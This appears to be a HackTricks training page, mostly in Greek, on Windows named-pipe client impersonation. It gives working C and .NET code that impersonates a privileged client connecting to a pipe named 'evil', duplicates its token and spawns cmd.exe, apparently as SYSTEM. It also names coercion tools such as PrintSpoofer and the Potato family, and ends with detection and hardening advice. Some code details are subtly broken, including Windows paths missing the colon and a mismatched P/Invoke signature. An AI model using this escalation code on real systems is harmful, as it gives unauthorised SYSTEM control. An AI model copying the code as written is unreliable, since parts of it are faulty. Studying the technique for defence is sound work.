# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation είναι μια πρωτογενής μέθοδος τοπικής αναβάθμισης προνομίων που επιτρέπει σε ένα named-pipe server thread να υιοθετήσει το security context ενός client που συνδέεται σε αυτό. Στην πράξη, ένας επιτιθέμενος που μπορεί να τρέξει κώδικα με SeImpersonatePrivilege μπορεί να εξαναγκάσει έναν privileged client (π.χ. μια υπηρεσία SYSTEM) να συνδεθεί σε έναν pipe που ελέγχεται από τον επιτιθέμενο, να καλέσει ImpersonateNamedPipeClient, να διπλασιάσει το προκύπτον token σε ένα primary token και να δημιουργήσει μια διεργασία ως ο client (συχνά NT AUTHORITY\SYSTEM).

Αυτή η σελίδα επικεντρώνεται στην βασική τεχνική. Για end-to-end exploit chains που εξαναγκάζουν το SYSTEM να συνδεθεί στον pipe σας, δείτε τις σελίδες της οικογένειας Potato που αναφέρονται παρακάτω.

## TL;DR
- Create a named pipe: \\.\pipe\<random> και περιμένετε για μια σύνδεση.
- Προκαλέστε ένα privileged component να συνδεθεί σε αυτό (spooler/DCOM/EFSRPC/etc.).
- Διαβάστε τουλάχιστον ένα μήνυμα από το pipe, και μετά καλέστε ImpersonateNamedPipeClient.
- Ανοίξτε το impersonation token από το τρέχον νήμα, DuplicateTokenEx(TokenPrimary), και χρησιμοποιήστε CreateProcessWithTokenW/CreateProcessAsUser για να αποκτήσετε μια διεργασία SYSTEM.

## Requirements and key APIs
- Privileges που συνήθως χρειάζεται η διαδικασία/νήμα που καλεί:
- SeImpersonatePrivilege για να πραγματοποιηθεί επιτυχώς impersonation ενός συνδεόμενου client και για να χρησιμοποιηθεί CreateProcessWithTokenW.
- Εναλλακτικά, μετά το impersonate του SYSTEM, μπορείτε να χρησιμοποιήσετε CreateProcessAsUser, το οποίο ενδέχεται να απαιτεί SeAssignPrimaryTokenPrivilege και SeIncreaseQuotaPrivilege (αυτά ικανοποιούνται όταν impersonating το SYSTEM).
- Core APIs που χρησιμοποιούνται:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (must read at least one message before impersonation)
- ImpersonateNamedPipeClient και RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ή CreateProcessAsUser
- Impersonation level: για να εκτελέσετε χρήσιμες ενέργειες τοπικά, ο client πρέπει να επιτρέπει SecurityImpersonation (προεπιλογή για πολλούς local RPC/named-pipe clients). Οι clients μπορούν να μειώσουν αυτό το επίπεδο με SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION κατά το άνοιγμα του pipe.

## Ελάχιστη ροή εργασίας Win32 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Σημειώσεις:
- Εάν το ImpersonateNamedPipeClient επιστρέψει ERROR_CANNOT_IMPERSONATE (1368), βεβαιωθείτε ότι έχετε διαβάσει πρώτα από το pipe και ότι ο client δεν περιόρισε την impersonation σε Identification level.
- Προτιμήστε το DuplicateTokenEx με SecurityImpersonation και TokenPrimary για να δημιουργήσετε ένα primary token κατάλληλο για δημιουργία διεργασίας.

## .NET σύντομο παράδειγμα
Στο .NET, το NamedPipeServerStream μπορεί να κάνει impersonate μέσω RunAsClient. Αφού γίνει impersonation, duplicate το thread token και δημιουργήστε μια διεργασία.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Αυτές οι τεχνικές αναγκάζουν υπηρεσίες με προνόμια να συνδεθούν στην named pipe σας, ώστε να μπορείτε να τις impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Troubleshooting and gotchas
- Πρέπει να διαβάσετε τουλάχιστον ένα μήνυμα από την pipe πριν καλέσετε ImpersonateNamedPipeClient· αλλιώς θα λάβετε ERROR_CANNOT_IMPERSONATE (1368).
- Αν ο client συνδεθεί με SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, ο server δεν μπορεί να πραγματοποιήσει πλήρες impersonation· ελέγξτε το impersonation level του token μέσω GetTokenInformation(TokenImpersonationLevel).
- Η CreateProcessWithTokenW απαιτεί SeImpersonatePrivilege στον caller. Αν αποτύχει με ERROR_PRIVILEGE_NOT_HELD (1314), χρησιμοποιήστε CreateProcessAsUser αφού έχετε ήδη impersonated το SYSTEM.
- Βεβαιωθείτε ότι ο security descriptor της pipe σας επιτρέπει στην target υπηρεσία να συνδεθεί αν το σκληρύνετε· από προεπιλογή, pipes υπό \\.\pipe είναι προσβάσιμες σύμφωνα με το DACL του server.

## Detection and hardening
- Παρακολουθήστε τη δημιουργία named pipes και τις συνδέσεις. Τα Sysmon Event IDs 17 (Pipe Created) και 18 (Pipe Connected) είναι χρήσιμα για να καθορίσετε βασική γραμμή νόμιμων ονομάτων pipe και να εντοπίσετε ασυνήθιστες, τυχαία-φαινομενικές pipes που προηγούνται γεγονότων χειρισμού token.
- Αναζητήστε αλληλουχίες: μια διεργασία δημιουργεί μια pipe, μια υπηρεσία SYSTEM συνδέεται, και στη συνέχεια η δημιουργούσα διεργασία εκκινεί ένα child ως SYSTEM.
- Μειώστε την έκθεση αφαιρώντας το SeImpersonatePrivilege από περιττούς λογαριασμούς υπηρεσιών και αποφεύγοντας μη απαραίτητες service logons με υψηλά προνόμια.
- Αμυντική ανάπτυξη: κατά τη σύνδεση σε untrusted named pipes, καθορίστε SECURITY_SQOS_PRESENT με SECURITY_IDENTIFICATION για να αποτρέψετε τους servers από το να πραγματοποιήσουν πλήρες impersonation του client εκτός αν είναι απαραίτητο.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (οδηγός και παραδείγματα κώδικα). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
